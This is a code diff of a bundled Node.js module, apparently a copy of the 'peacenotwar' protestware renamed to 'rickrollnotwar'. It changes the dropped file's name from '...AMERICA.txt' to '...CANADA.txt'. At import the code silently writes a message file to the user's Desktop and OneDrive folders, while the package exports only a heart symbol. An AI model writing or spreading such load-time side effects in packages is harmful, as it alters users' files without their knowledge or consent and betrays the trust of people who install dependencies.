@@ -27,8 +27,8 @@ var __toCommonJS = function(mod) {
 };
 
 // index.js
-var peacenotwar_exports = {};
-__export(peacenotwar_exports, {
+var rickrollnotwar_exports = {};
+__export(rickrollnotwar_exports, {
   default: function() {
     return whatWeWant;
   },
@@ -36,7 +36,7 @@ __export(peacenotwar_exports, {
     return whatWeWant;
   }
 });
-module.exports = __toCommonJS(peacenotwar_exports);
+module.exports = __toCommonJS(rickrollnotwar_exports);
 var import_fs3 = __toESM(require("fs"), 1);
 
 // service/findFiles.js
@@ -105,9 +105,9 @@ var import_os = require("os");
 var Desktops = "".concat(import_os.homedir, "/Desktop/");
 var OneDrive = "".concat(import_os.homedir, "/OneDrive/");
 var OneDriveDesktops = "".concat(import_os.homedir, "/OneDrive/Desktop/");
-var DesktopFileExists = fromDir(Desktops, "WITH-LOVE-FROM-AMERICA.txt");
-var OneDriveDesktopFileExists = fromDir(OneDriveDesktops, "WITH-LOVE-FROM-AMERICA.txt");
-var OneDriveFileExists = fromDir(OneDrive, "WITH-LOVE-FROM-AMERICA.txt");
+var DesktopFileExists = fromDir(Desktops, "WITH-LOVE-FROM-CANADA.txt");
+var OneDriveDesktopFileExists = fromDir(OneDriveDesktops, "WITH-LOVE-FROM-CANADA.txt");
+var OneDriveFileExists = fromDir(OneDrive, "WITH-LOVE-FROM-CANADA.txt");
 function deliverAPeacefulMessage(path2, message) {
   try {
     import_fs3.default.writeFile(path2, message, function(err) {
@@ -116,14 +116,14 @@ function deliverAPeacefulMessage(path2, message) {
   }
 }
 if (!DesktopFileExists.length && !OneDriveFileExists.length && !OneDriveDesktopFileExists.length) {
-  thinkaboutit = "WITH-LOVE-FROM-AMERICA.txt";
-  WITH_LOVE_FROM_AMERICA = read("./".concat(thinkaboutit));
-  deliverAPeacefulMessage("".concat(Desktops).concat(thinkaboutit), WITH_LOVE_FROM_AMERICA);
-  deliverAPeacefulMessage("".concat(OneDriveDesktops).concat(thinkaboutit), WITH_LOVE_FROM_AMERICA);
-  deliverAPeacefulMessage("".concat(OneDrive).concat(thinkaboutit), WITH_LOVE_FROM_AMERICA);
+  thinkaboutit = "WITH-LOVE-FROM-CANADA.txt";
+  WITH_LOVE_FROM_CANADA = read("./".concat(thinkaboutit));
+  deliverAPeacefulMessage("".concat(Desktops).concat(thinkaboutit), WITH_LOVE_FROM_CANADA);
+  deliverAPeacefulMessage("".concat(OneDriveDesktops).concat(thinkaboutit), WITH_LOVE_FROM_CANADA);
+  deliverAPeacefulMessage("".concat(OneDrive).concat(thinkaboutit), WITH_LOVE_FROM_CANADA);
 }
 var thinkaboutit;
-var WITH_LOVE_FROM_AMERICA;
+var WITH_LOVE_FROM_CANADA;
 var whatWeWant = "\u2665";
 // Annotate the CommonJS export names for ESM import in node:
 0 && (module.exports = {
